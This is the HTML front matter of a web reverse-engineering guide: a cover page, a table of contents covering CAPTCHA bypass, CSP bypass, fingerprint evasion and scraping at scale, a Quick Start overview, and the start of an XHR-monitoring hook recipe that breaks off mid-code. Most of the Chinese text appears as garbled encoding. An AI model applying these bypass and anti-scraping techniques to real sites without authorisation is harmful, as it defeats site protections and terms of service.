<!DOCTYPE html>
<html lang="zh-CN">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Web Reverse Engineering Cookbook</title>
</head>

<body>

  <div class="cover-page">
    <div style="margin-top: 150pt;">
      <h1 style="font-size: 36pt; color: #1a1a1a; margin-bottom: 30pt; border: none; page-break-before: auto;"
        class="no-page-break">
        Web Reverse Engineering Cookbook
      </h1>
      <h2 style="font-size: 20pt; color: #666; font-weight: 400; border: none; padding: 0;">
        Complete Guide to Web Security Analysis
      </h2>
      <div style="margin-top: 80pt; font-size: 14pt; color: #888;">
        <p>Foundations, Tools, Techniques, and Advanced Topics</p>
        <p>Covers Burp Suite, DevTools, Puppeteer, AST Tools and More</p>
        <p>Including Engineering Practices and Case Studies</p>
      </div>
    </div>
  </div>
  <div style="page-break-before: always; text-align: center; margin-top: 80pt;">
    <div style="font-size: 12pt; color: #aaa;">
      <p style="font-size: 48pt; margin-bottom: 15pt;">ğŸ§‘â€ğŸ’»</p>
      <p style="font-size: 16pt; color: #666; margin-bottom: 20pt;"><strong>Author: +5</strong></p>
      <p>ğŸ“§ Email: overkazaf@gmail.com</p>
      <p>ğŸ’¬ WeChat: _0xAF_</p>
      <p style="margin-top: 30pt;">ğŸ“… Date: 2025-10-11</p>
      <p>ğŸ“Œ Version: v1.0</p>
    </div>
    <div style="margin-top: 60pt; padding: 25pt 40pt; border-top: 1px solid #ddd; border-bottom: 1px solid #ddd;">
      <p style="font-size: 11pt; color: #555; font-style: italic; line-height: 1.8; text-align: center;">
        "If the highest aim of a captain were to preserve his ship,<br />
        he would keep it in port forever."
      </p>
      <p style="font-size: 9pt; color: #888; text-align: right; margin-top: 10pt;">
        â€” St. Thomas Aquinas, <em>Summa Theologica</em> (1265-1274)
      </p>
    </div>
    <div style="margin-top: 50pt; padding: 25pt 40pt; background-color: #f9f9f9; border-radius: 8pt;">
      <p style="font-size: 10.5pt; color: #444; line-height: 1.9; text-align: justify; margin-bottom: 15pt;">
        The journey begins with the thrill of solving puzzlesâ€”that exhilarating rush when code
        finally yields its secrets. Yet seasoned reverse engineers walk a different path. They
        remain humble, ever-curious, and deeply reflective. In time, they all return to first
        principles: understanding how systems are <em>built</em> is the only true way to understand
        how they can be <em>unraveled</em>.
      </p>
      <p style="font-size: 10pt; color: #666; line-height: 1.8; text-align: justify; font-style: italic;">
        åˆæ¶‰æ­¤é“ï¼Œå¤šä¸ºç ´è§£ä¹‹æ—¶çš„å¿«æ„ã€‚è€Œè¡Œè‡³æ·±å¤„è€…ï¼Œæ—©å·²è¶…è¶Šè¿™ä»½æ¬£å–œã€‚ä»–ä»¬æ€€è°¦å‘ä¹‹å¿ƒï¼Œ
        æŒæ±‚çŸ¥ä¹‹å¿µï¼Œå–„äºæ€è€ƒï¼Œæœ€ç»ˆéƒ½ä¼šå›å½’æŠ€æœ¯çš„æœ¬è´¨â€”â€”å”¯æœ‰æ´æ‚‰ç³»ç»Ÿ<strong>æ„å»º</strong>ä¹‹é“ï¼Œ
        æ–¹èƒ½å‚é€å…¶<strong>æ‹†è§£</strong>ä¹‹æ³•ã€‚çŸ¥å·±çŸ¥å½¼ï¼Œç™¾æˆ˜ä¸æ®†ã€‚
      </p>
    </div>
  </div>

  <div class="toc-page">
    <h1 class="toc-title no-page-break">ğŸ“š ç›®å½•</h1>

    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ  é¦–é¡µ</h2>
    </div>
    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ“„ Part I: Getting Started</h2>

      <div class="toc-subsection">ğŸ“‚ Quick Start</div>

      <div class="toc-item"> 1. Overview</div>

      <div class="toc-item"> 2. Your First Hook</div>

      <div class="toc-item"> 3. Decrypt API Params</div>

      <div class="toc-item"> 4. Bypass Simple CAPTCHA</div>
    </div>
    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ“„ Part II: Kitchen Basics</h2>

      <div class="toc-subsection">ğŸ“‚ Foundations</div>

      <div class="toc-item"> 5. HTTP/HTTPS Protocol</div>

      <div class="toc-item"> 6. Browser Architecture</div>

      <div class="toc-item"> 7. JavaScript Basics</div>

      <div class="toc-item"> 8. JavaScript Execution Mechanism</div>

      <div class="toc-item"> 9. DOM And BOM</div>

      <div class="toc-item"> 10. WebAssembly Basics</div>

      <div class="toc-item"> 11. Cookie And Storage</div>

      <div class="toc-item"> 12. CORS And Same Origin Policy</div>

      <div class="toc-item"> 13. TLS/SSL Handshake</div>

      <div class="toc-item"> 14. Web API And Ajax</div>
    </div>
    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ“„ Part III: Tools & Ingredients</h2>

      <div class="toc-subsection">ğŸ“‚ Tooling</div>

      <div class="toc-item"> 15. Browser DevTools</div>

      <div class="toc-item"> 16. Burp Suite Guide</div>

      <div class="toc-item"> 17. Fiddler Guide</div>

      <div class="toc-item"> 18. Charles Guide</div>

      <div class="toc-item"> 19. Wireshark Guide</div>

      <div class="toc-item"> 20. Puppeteer & Playwright</div>

      <div class="toc-item"> 21. Selenium Guide</div>

      <div class="toc-item"> 22. AST Tools</div>

      <div class="toc-item"> 23. Node.js Debugging</div>

      <div class="toc-item"> 24. V8 Tools</div>
    </div>
    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ“„ Part IV: Basic Recipes</h2>

      <div class="toc-subsection">ğŸ“‚ Basic Recipes</div>

      <div class="toc-item"> 25. RE Workflow</div>

      <div class="toc-item"> 26. Debugging Techniques</div>

      <div class="toc-item"> 27. Hooking Techniques</div>

      <div class="toc-item"> 28. API Reverse Engineering</div>

      <div class="toc-item"> 29. Crypto Identification</div>

      <div class="toc-item"> 30. Dynamic Parameter Analysis</div>

      <div class="toc-item"> 31. WebSocket Reversing</div>
    </div>
    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ“„ Part V: Advanced Recipes</h2>

      <div class="toc-subsection">ğŸ“‚ Advanced Recipes</div>

      <div class="toc-item"> 32. JavaScript Deobfuscation</div>

      <div class="toc-item"> 33. CAPTCHA Bypass</div>

      <div class="toc-item"> 34. Browser Fingerprinting</div>

      <div class="toc-item"> 35. JavaScript VM Protection</div>

      <div class="toc-item"> 36. WebAssembly Reversing</div>

      <div class="toc-item"> 37. Anti-Scraping Deep Dive</div>

      <div class="toc-item"> 38. Frontend Hardening</div>

      <div class="toc-item"> 39. CSP Bypass</div>

      <div class="toc-item"> 40. WebRTC Fingerprinting</div>

      <div class="toc-item"> 41. Canvas Fingerprinting</div>

      <div class="toc-item"> 42. TLS Fingerprinting</div>

      <div class="toc-item"> 43. HTTP/2 & HTTP/3</div>

      <div class="toc-item"> 44. PWA & Service Worker</div>
    </div>
    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ“„ Part VI: Complete Menus</h2>

      <div class="toc-subsection">ğŸ“‚ Case Studies</div>

      <div class="toc-item"> 45. E-commerce</div>

      <div class="toc-item"> 46. Social Media</div>

      <div class="toc-item"> 47. Financial Websites</div>

      <div class="toc-item"> 48. Video Streaming</div>

      <div class="toc-item"> 49. News Aggregator</div>

      <div class="toc-item"> 50. Search Engine</div>

      <div class="toc-subsection">ğŸ“‚ Engineering</div>

      <div class="toc-item"> 51. Distributed Scraping</div>

      <div class="toc-item"> 52. Proxy Pool Management</div>

      <div class="toc-item"> 53. Data Storage Solutions</div>

      <div class="toc-item"> 54. Message Queue Application</div>

      <div class="toc-item"> 55. Docker Deployment</div>

      <div class="toc-item"> 56. Monitoring And Alerting</div>

      <div class="toc-item"> 57. Anti-Anti-Scraping Framework</div>
    </div>
    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ“„ Part VII: Code Kitchen</h2>

      <div class="toc-subsection">ğŸ“‚ Scripts</div>

      <div class="toc-item"> 58. JavaScript Hook Scripts</div>

      <div class="toc-item"> 59. Deobfuscation Scripts</div>

      <div class="toc-item"> 60. Automation Scripts</div>

      <div class="toc-item"> 61. Crypto Detection Scripts</div>
    </div>
    <div class="toc-section">
      <h2 class="toc-section-title">ğŸ“„ Part VIII: Reference</h2>

      <div class="toc-subsection">ğŸ“‚ Cheat Sheets</div>

      <div class="toc-item"> 62. Overview</div>

      <div class="toc-item"> 63. Common Commands</div>

      <div class="toc-item"> 64. Crypto Signatures</div>

      <div class="toc-item"> 65. Tool Shortcuts</div>

      <div class="toc-item"> 66. Regex Patterns</div>

      <div class="toc-item"> 67. HTTP Headers</div>

      <div class="toc-subsection">ğŸ“‚ Templates</div>

      <div class="toc-item"> 68. Overview</div>

      <div class="toc-item"> 69. Basic Scraper</div>

      <div class="toc-item"> 70. Reverse Project</div>

      <div class="toc-item"> 71. Docker Setup</div>

      <div class="toc-item"> 72. CI/CD Pipeline</div>

      <div class="toc-item"> 73. Distributed Crawler</div>

      <div class="toc-subsection">ğŸ“‚ Troubleshooting</div>

      <div class="toc-item"> 74. Overview</div>

      <div class="toc-item"> 75. Network Issues</div>

      <div class="toc-item"> 76. Anti-Scraping Issues</div>

      <div class="toc-item"> 77. JavaScript Debugging</div>

      <div class="toc-item"> 78. Tool Issues</div>

      <div class="toc-item"> 79. Data Issues</div>

      <div class="toc-item"> 80. Docker Issues</div>

      <div class="toc-subsection">ğŸ“‚ Resources</div>

      <div class="toc-item"> 81. GitHub Projects</div>

      <div class="toc-item"> 82. Learning Resources</div>

      <div class="toc-item"> 83. FAQ</div>
    </div>
  </div>
  <div class="chapter">
    <h1 class="no-page-break">ğŸ“„ Part I: Getting Started</h1>

    <div class="section" id="00-Quick-Start-index">
      <h2>1. Overview</h2>
      <h1 id="å¿«é€Ÿå¼€å§‹-quick-start">å¿«é€Ÿå¼€å§‹ - Quick Start</h1>

      <p>æ¬¢è¿æ¥åˆ° Web é€†å‘å·¥ç¨‹çƒ¹é¥ªé£Ÿè°±ï¼æœ¬ç« èŠ‚å°†å¸®åŠ©ä½ å¿«é€Ÿä¸Šæ‰‹ï¼Œé€šè¿‡å‡ ä¸ªç®€å•çš„é…æ–¹ï¼Œåœ¨æœ€çŸ­æ—¶é—´å†…æŒæ¡ Web é€†å‘çš„æ ¸å¿ƒæŠ€èƒ½ã€‚</p>

      <hr />

      <h2 id="å­¦ä¹ è·¯å¾„">ğŸ¯ å­¦ä¹ è·¯å¾„</h2>

      <p>æˆ‘ä»¬ä¸ºä½ å‡†å¤‡äº†ä¸‰ä¸ªæ¸è¿›å¼çš„å¿«é€Ÿé…æ–¹ï¼š</p>

      <h3 id="1-ä½ çš„ç¬¬ä¸€ä¸ª-hook00-quick-start-your-first-hook">1ï¸âƒ£ <a href="#00-Quick-Start-your-first-hook">ä½ çš„ç¬¬ä¸€ä¸ª Hook</a>
      </h3>

      <p><strong>éš¾åº¦</strong>: â­<br />
        <strong>æ—¶é—´</strong>: 15åˆ†é’Ÿ<br />
        <strong>å­¦ä¹ </strong>: å¦‚ä½•åœ¨æµè§ˆå™¨ä¸­æ‹¦æˆªå’Œç›‘æ§ç½‘ç»œè¯·æ±‚
      </p>

      <p>è¿™æ˜¯ä½ çš„ç¬¬ä¸€é“èœï¼å­¦ä¼šä½¿ç”¨ JavaScript Hook æŠ€æœ¯ç›‘æ§ç½‘ç«™çš„æ‰€æœ‰ XHR å’Œ Fetch è¯·æ±‚ï¼Œäº†è§£ç½‘ç«™åœ¨èƒŒååšä»€ä¹ˆã€‚</p>

      <p><strong>ä½ å°†å­¦åˆ°</strong>:</p>

      <ul>
        <li>æ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
        <li>æ³¨å…¥ Hook è„šæœ¬</li>
        <li>æŸ¥çœ‹è¯·æ±‚å’Œå“åº”æ•°æ®</li>
        <li>ç†è§£ Hook çš„å·¥ä½œåŸç†</li>
      </ul>

      <hr />

      <h3 id="2-è§£å¯†-api-å‚æ•°00-quick-start-decrypt-api-params">2ï¸âƒ£ <a href="#00-Quick-Start-decrypt-api-params">è§£å¯† API
          å‚æ•°</a></h3>

      <p><strong>éš¾åº¦</strong>: â­â­<br />
        <strong>æ—¶é—´</strong>: 30åˆ†é’Ÿ<br />
        <strong>å­¦ä¹ </strong>: å¦‚ä½•å®šä½å’Œç ´è§£åŠ å¯†çš„ API å‚æ•°
      </p>

      <p>è¿›é˜¶é…æ–¹ï¼å­¦ä¼šè¿½è¸ªåŠ å¯†å‡½æ•°ï¼Œåˆ†æç®—æ³•ï¼Œæœ€ç»ˆç”¨ Python å¤ç°åŠ å¯†é€»è¾‘ã€‚</p>

      <p><strong>ä½ å°†å­¦åˆ°</strong>:</p>

      <ul>
        <li>ä½¿ç”¨ XHR æ–­ç‚¹å®šä½åŠ å¯†å‡½æ•°</li>
        <li>åˆ†æ JavaScript åŠ å¯†ä»£ç </li>
        <li>æå–å¯†é’¥å’Œç®—æ³•</li>
        <li>ç”¨ Python å®ç°ç›¸åŒçš„åŠ å¯†</li>
      </ul>

      <hr />

      <h3 id="3-ç»•è¿‡ç®€å•éªŒè¯ç 00-quick-start-bypass-simple-captcha">3ï¸âƒ£ <a
          href="#00-Quick-Start-bypass-simple-captcha">ç»•è¿‡ç®€å•éªŒè¯ç </a></h3>

      <p><strong>éš¾åº¦</strong>: â­â­<br />
        <strong>æ—¶é—´</strong>: 30åˆ†é’Ÿ<br />
        <strong>å­¦ä¹ </strong>: å¦‚ä½•åˆ†æå’Œç»•è¿‡ç®€å•çš„å›¾å½¢éªŒè¯ç 
      </p>

      <p>å®æˆ˜é…æ–¹ï¼å­¦ä¼šä½¿ç”¨ OCR æŠ€æœ¯è¯†åˆ«éªŒè¯ç ï¼Œæˆ–è€…é€šè¿‡åˆ†æå‘ç°éªŒè¯ç çš„æ¼æ´ã€‚</p>

      <p><strong>ä½ å°†å­¦åˆ°</strong>:</p>

      <ul>
        <li>æŠ“å–éªŒè¯ç å›¾ç‰‡</li>
        <li>ä½¿ç”¨ OCR è¯†åˆ«éªŒè¯ç </li>
        <li>åˆ†æéªŒè¯ç ç”Ÿæˆé€»è¾‘</li>
        <li>è‡ªåŠ¨åŒ–éªŒè¯ç è¯†åˆ«</li>
      </ul>

      <hr />

      <h2 id="å¼€å§‹ä¹‹å‰">ğŸ“š å¼€å§‹ä¹‹å‰</h2>

      <h3 id="å¿…å¤‡å·¥å…·">å¿…å¤‡å·¥å…·</h3>

      <p>åœ¨å¼€å§‹çƒ¹é¥ªä¹‹å‰ï¼Œè¯·ç¡®ä¿ä½ çš„å¨æˆ¿ï¼ˆå¼€å‘ç¯å¢ƒï¼‰å·²å‡†å¤‡å¥½ä»¥ä¸‹å·¥å…·ï¼š</p>

      <p>âœ… <strong>æµè§ˆå™¨</strong>: Chrome æˆ– Firefoxï¼ˆæ¨è Chromeï¼‰<br />
        âœ… <strong>æ–‡æœ¬ç¼–è¾‘å™¨</strong>: VS Code æˆ–ä»»ä½•ä½ å–œæ¬¢çš„ç¼–è¾‘å™¨<br />
        âœ… <strong>Python 3.7+</strong>: ç”¨äºç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬<br />
        âœ… <strong>åŸºç¡€çŸ¥è¯†</strong>: JavaScript åŸºç¡€è¯­æ³•</p>

      <h3 id="æ¨èå®‰è£…">æ¨èå®‰è£…</h3>

      <p>ä»¥ä¸‹å·¥å…·å°†åœ¨åç»­é…æ–¹ä¸­ç”¨åˆ°ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Python ä¾èµ–</span>
pip<span class="w"> </span>install<span class="w"> </span>requests<span class="w"> </span>beautifulsoup4<span class="w"> </span>pillow<span class="w"> </span>pytesseract

<span class="c1"># Node.js å·¥å…·ï¼ˆå¯é€‰ï¼‰</span>
npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>@babel/cli<span class="w"> </span>@babel/core
</code></pre>
      </div>

      <hr />

      <h2 id="å­¦ä¹ å»ºè®®">ğŸ“ å­¦ä¹ å»ºè®®</h2>

      <h3 id="å¯¹äºå®Œå…¨æ–°æ‰‹">å¯¹äºå®Œå…¨æ–°æ‰‹</h3>

      <ol>
        <li><strong>æŒ‰é¡ºåºå­¦ä¹ </strong>: ä»ç¬¬ä¸€ä¸ªé…æ–¹å¼€å§‹ï¼Œä¸è¦è·³è¿‡</li>
        <li><strong>åŠ¨æ‰‹å®è·µ</strong>: æ¯ä¸ªé…æ–¹éƒ½è¦äº²è‡ªæ“ä½œä¸€é</li>
        <li><strong>ä¸è¦ç€æ€¥</strong>: ç†è§£åŸç†æ¯”å¿«é€Ÿå®Œæˆæ›´é‡è¦</li>
        <li><strong>è®°å½•ç¬”è®°</strong>: è®°ä¸‹ä½ çš„å‘ç°å’Œç–‘é—®</li>
      </ol>

      <h3 id="å¯¹äºæœ‰åŸºç¡€çš„å­¦ä¹ è€…">å¯¹äºæœ‰åŸºç¡€çš„å­¦ä¹ è€…</h3>

      <ul>
        <li>ä½ å¯ä»¥ç›´æ¥è·³åˆ°æ„Ÿå…´è¶£çš„é…æ–¹</li>
        <li>å°è¯•ä¿®æ”¹é…æ–¹å‚æ•°ï¼Œæ¢ç´¢ä¸åŒæ•ˆæœ</li>
        <li>å°è¯•å°†å­¦åˆ°çš„æŠ€æœ¯åº”ç”¨åˆ°å®é™…ç½‘ç«™</li>
      </ul>

      <hr />

      <h2 id="å¦‚ä½•ä½¿ç”¨è¿™äº›é…æ–¹">ğŸ’¡ å¦‚ä½•ä½¿ç”¨è¿™äº›é…æ–¹</h2>

      <p>æ¯ä¸ªé…æ–¹éƒ½é‡‡ç”¨ç»Ÿä¸€çš„ç»“æ„ï¼š</p>

      <pre><code>ğŸ“Š é…æ–¹ä¿¡æ¯
â”œâ”€â”€ éš¾åº¦ (â­-â­â­â­â­â­)
â”œâ”€â”€ é¢„è®¡æ—¶é—´
â””â”€â”€ æ‰€éœ€å·¥å…·

ğŸ¯ ä½ å°†å­¦åˆ°
â”œâ”€â”€ æŠ€èƒ½ç‚¹1
â”œâ”€â”€ æŠ€èƒ½ç‚¹2
â””â”€â”€ æŠ€èƒ½ç‚¹3

ğŸ“ å‡†å¤‡å·¥ä½œ
â””â”€â”€ å‰ç½®æ¡ä»¶æ¸…å•

ğŸš€ æ­¥éª¤
â”œâ”€â”€ Step 1
â”œâ”€â”€ Step 2
â””â”€â”€ Step 3

âœ… éªŒè¯æ¸…å•
â””â”€â”€ å¦‚ä½•ç¡®è®¤æˆåŠŸ

â— å¸¸è§é—®é¢˜
â””â”€â”€ FAQ
</code></pre>

      <hr />

      <h2 id="å¸¸è§é—®é¢˜">ğŸ”¥ å¸¸è§é—®é¢˜</h2>

      <h3 id="q-æˆ‘éœ€è¦å¤šå°‘ç¼–ç¨‹åŸºç¡€">Q: æˆ‘éœ€è¦å¤šå°‘ç¼–ç¨‹åŸºç¡€ï¼Ÿ</h3>

      <p><strong>A</strong>: åŸºç¡€çš„ JavaScript è¯­æ³•çŸ¥è¯†å³å¯ã€‚å¦‚æœä½ ä¼šï¼š</p>

      <ul>
        <li>å˜é‡ã€å‡½æ•°ã€å¯¹è±¡</li>
        <li>if/else æ¡ä»¶åˆ¤æ–­</li>
        <li>åŸºæœ¬çš„è°ƒè¯•æŠ€å·§</li>
      </ul>

      <p>é‚£ä½ å°±å¯ä»¥å¼€å§‹äº†ï¼ä¸æ‡‚çš„åœ°æ–¹å¯ä»¥å‚è€ƒ <a href="#01-Foundations-javascript-basics">JavaScript åŸºç¡€</a>ã€‚</p>

      <h3 id="q-è¿™äº›æŠ€æœ¯æ˜¯å¦åˆæ³•">Q: è¿™äº›æŠ€æœ¯æ˜¯å¦åˆæ³•ï¼Ÿ</h3>

      <p><strong>A</strong>: Web é€†å‘æŠ€æœ¯æœ¬èº«æ˜¯ä¸­ç«‹çš„å·¥å…·ã€‚è¯·éµå®ˆï¼š</p>

      <ul>
        <li>âœ… ç”¨äºå­¦ä¹ å’Œç ”ç©¶</li>
        <li>âœ… ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•</li>
        <li>âœ… éµå®ˆç½‘ç«™çš„æœåŠ¡æ¡æ¬¾</li>
        <li>âŒ ä¸è¦ç”¨äºéæ³•ç›®çš„</li>
        <li>âŒ ä¸è¦ç”¨äºå•†ä¸šçˆ¬è™«ï¼ˆæœªç»æˆæƒï¼‰</li>
      </ul>

      <h3 id="q-å®Œæˆè¿™ä¸‰ä¸ªé…æ–¹åæˆ‘èƒ½åšä»€ä¹ˆ">Q: å®Œæˆè¿™ä¸‰ä¸ªé…æ–¹åæˆ‘èƒ½åšä»€ä¹ˆï¼Ÿ</h3>

      <p><strong>A</strong>: ä½ å°†èƒ½å¤Ÿï¼š</p>

      <ul>
        <li>åˆ†æå¤§éƒ¨åˆ†ç½‘ç«™çš„è¯·æ±‚æœºåˆ¶</li>
        <li>ç ´è§£ç®€å•åˆ°ä¸­ç­‰éš¾åº¦çš„åŠ å¯†</li>
        <li>ç»•è¿‡åŸºç¡€çš„åçˆ¬è™«æªæ–½</li>
        <li>ç»§ç»­å­¦ä¹ æ›´é«˜çº§çš„é…æ–¹</li>
      </ul>

      <hr />

      <h2 id="å‡†å¤‡å¥½äº†å—">ğŸš€ å‡†å¤‡å¥½äº†å—ï¼Ÿ</h2>

      <p>é€‰æ‹©ä½ çš„ç¬¬ä¸€ä¸ªé…æ–¹ï¼š</p>

      <ol>
        <li>ğŸ£ <a href="#00-Quick-Start-your-first-hook">ä½ çš„ç¬¬ä¸€ä¸ª Hook</a> - æ¨èä»è¿™é‡Œå¼€å§‹</li>
        <li>ğŸ” <a href="#00-Quick-Start-decrypt-api-params">è§£å¯† API å‚æ•°</a></li>
        <li>ğŸ¤– <a href="#00-Quick-Start-bypass-simple-captcha">ç»•è¿‡ç®€å•éªŒè¯ç </a></li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“– ç›¸å…³ç« èŠ‚</h2>

      <p>å®Œæˆå¿«é€Ÿå…¥é—¨åï¼Œä½ å¯ä»¥ç»§ç»­æ·±å…¥å­¦ä¹ ï¼š</p>

      <ul>
        <li><a href="../03-Basic-Recipes/">åŸºç¡€é…æ–¹</a> - æ ¸å¿ƒæŠ€æœ¯è¯¦è§£</li>
        <li><a href="../04-Advanced-Recipes/">é«˜çº§é…æ–¹</a> - é«˜çº§æŠ€æœ¯æŒ‘æˆ˜</li>
        <li><a href="../05-Case-Studies/">æ¡ˆä¾‹ç ”ç©¶</a> - çœŸå®ç½‘ç«™åˆ†æ</li>
      </ul>

      <hr />

      <p><strong>Happy Cooking!</strong> ğŸ‰</p>

      <p>è®©æˆ‘ä»¬å¼€å§‹ä½ çš„ Web é€†å‘å·¥ç¨‹ä¹‹æ—…å§ï¼</p>

    </div>

    <div class="section" id="00-Quick-Start-your-first-hook">
      <h2>2. Your First Hook</h2>
      <h1 id="é…æ–¹ä½ çš„ç¬¬ä¸€ä¸ª-hook">é…æ–¹ï¼šä½ çš„ç¬¬ä¸€ä¸ª Hook</h1>

      <h2 id="é…æ–¹ä¿¡æ¯">ğŸ“Š é…æ–¹ä¿¡æ¯</h2>

      <table>
        <thead>
          <tr>
            <th>é¡¹ç›®</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>éš¾åº¦</strong></td>
            <td>â­ (å…¥é—¨çº§)</td>
          </tr>
          <tr>
            <td><strong>é¢„è®¡æ—¶é—´</strong></td>
            <td>15åˆ†é’Ÿ</td>
          </tr>
          <tr>
            <td><strong>æ‰€éœ€å·¥å…·</strong></td>
            <td>Chrome æµè§ˆå™¨</td>
          </tr>
          <tr>
            <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
            <td>ç›‘æ§ç½‘ç«™çš„æ‰€æœ‰ç½‘ç»œè¯·æ±‚</td>
          </tr>
          <tr>
            <td><strong>å‰ç½®çŸ¥è¯†</strong></td>
            <td>æ— éœ€ç¼–ç¨‹åŸºç¡€</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="ä½ å°†å­¦åˆ°">ğŸ¯ ä½ å°†å­¦åˆ°</h2>

      <p>å®Œæˆè¿™ä¸ªé…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>

      <ul>
        <li>âœ… æ‰“å¼€å’Œä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
        <li>âœ… åœ¨æµè§ˆå™¨ä¸­æ³¨å…¥ JavaScript ä»£ç </li>
        <li>âœ… æ‹¦æˆªå’ŒæŸ¥çœ‹æ‰€æœ‰ XHR/Fetch è¯·æ±‚</li>
        <li>âœ… ç†è§£ Hook æŠ€æœ¯çš„åŸºæœ¬åŸç†</li>
        <li>âœ… å¯¼å‡ºå’Œä¿å­˜æ‹¦æˆªåˆ°çš„æ•°æ®</li>
      </ul>

      <hr />

      <h2 id="å‡†å¤‡å·¥ä½œ">ğŸ“ å‡†å¤‡å·¥ä½œ</h2>

      <h3 id="æ£€æŸ¥æ¸…å•">æ£€æŸ¥æ¸…å•</h3>

      <p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œè¯·ç¡®è®¤ï¼š</p>

      <ul>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> å·²å®‰è£… Chrome æµè§ˆå™¨ï¼ˆæˆ– Edge/Firefoxï¼‰</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> èƒ½å¤Ÿè®¿é—®äº’è”ç½‘</li>
        <li><input type="checkbox" class="task-list-item-checkbox" disabled> å‡†å¤‡ä¸€ä¸ªç›®æ ‡ç½‘ç«™ï¼ˆæ¨èç”¨ <a
            href="https://jsonplaceholder.typicode.com/">https://jsonplaceholder.typicode.com/</a> ä½œä¸ºç»ƒä¹ ï¼‰</li>
      </ul>

      <h3 id="èƒŒæ™¯çŸ¥è¯†">èƒŒæ™¯çŸ¥è¯†</h3>

      <p><strong>ä»€ä¹ˆæ˜¯ Hookï¼Ÿ</strong></p>

      <p>Hookï¼ˆé’©å­ï¼‰å°±åƒåœ¨æ•°æ®æµåŠ¨çš„ç®¡é“ä¸Šå®‰è£…ä¸€ä¸ª"ç›‘å¬å™¨"ï¼Œå¯ä»¥ï¼š</p>

      <ul>
        <li>æŸ¥çœ‹é€šè¿‡ç®¡é“çš„æ‰€æœ‰æ•°æ®</li>
        <li>ä¿®æ”¹æ•°æ®å†…å®¹</li>
        <li>è®°å½•æ•°æ®ç”¨äºåˆ†æ</li>
      </ul>

      <p>åœ¨ Web é€†å‘ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦ Hook ç½‘ç»œè¯·æ±‚å‡½æ•°ï¼Œç›‘æ§ç½‘ç«™å‘é€å’Œæ¥æ”¶çš„æ•°æ®ã€‚</p>

      <hr />

      <h2 id="æ­¥éª¤è¯¦è§£">ğŸš€ æ­¥éª¤è¯¦è§£</h2>

      <h3 id="step-1-æ‰“å¼€å¼€å‘è€…å·¥å…·">Step 1: æ‰“å¼€å¼€å‘è€…å·¥å…·</h3>

      <ol>
        <li>
          <p><strong>æ‰“å¼€ Chrome æµè§ˆå™¨</strong></p>
        </li>
        <li>
          <p><strong>è®¿é—®æµ‹è¯•ç½‘ç«™</strong>:</p>

          <pre><code>https://jsonplaceholder.typicode.com/
</code></pre>
        </li>
        <li>
          <p><strong>æ‰“å¼€å¼€å‘è€…å·¥å…·</strong>ï¼ˆä¸‰ç§æ–¹å¼ä»»é€‰å…¶ä¸€ï¼‰:</p>

          <ul>
            <li>æŒ‰ <code>F12</code> é”®</li>
            <li>æŒ‰ <code>Ctrl+Shift+I</code> (Windows) æˆ– <code>Cmd+Option+I</code> (Mac)</li>
            <li>å³é”®é¡µé¢ â†’ &#8220;æ£€æŸ¥&#8221;</li>
          </ul>
        </li>
        <li>
          <p><strong>åˆ‡æ¢åˆ° Console æ ‡ç­¾</strong></p>
        </li>
      </ol>

      <p><img src="https://via.placeholder.com/800x400?text=DevTools+Console" alt="å¼€å‘è€…å·¥å…·ç•Œé¢" /></p>

      <p>âœ… <strong>éªŒè¯</strong>: ä½ åº”è¯¥çœ‹åˆ°ä¸€ä¸ªå¯ä»¥è¾“å…¥ä»£ç çš„æ§åˆ¶å°ç•Œé¢</p>

      <hr />

      <h3 id="step-2-æ³¨å…¥-hook-ä»£ç ">Step 2: æ³¨å…¥ Hook ä»£ç </h3>

      <ol>
        <li><strong>å¤åˆ¶ä»¥ä¸‹ä»£ç </strong>:</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ğŸ£ Universal Network Monitor Hook</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ğŸ£ Network Hookå·²å¯åŠ¨ï¼&#39;</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// Hook XMLHttpRequest</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalXHROpen</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="p">;</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalXHRSend</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>

<span class="w">    </span><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">open</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
